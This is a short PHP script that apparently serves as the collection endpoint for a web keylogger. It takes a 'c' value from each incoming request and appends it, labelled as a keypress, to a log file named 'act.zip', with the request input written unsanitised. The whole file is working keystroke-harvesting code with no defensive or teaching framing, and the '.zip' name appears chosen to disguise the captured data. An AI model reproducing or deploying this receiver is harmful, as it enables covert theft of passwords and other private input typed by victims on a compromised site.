<?php
if(!empty($_GET['c'])) {
  $f=fopen("act.zip","a+");
  $act= $_GET['c'];
  $a='{"type":"keypress", "value":"';
  fwrite($f, $a . $act . '" },'."\r\n");
  
  //fwrite($f,$_GET['c']);
  fclose($f);
}
?>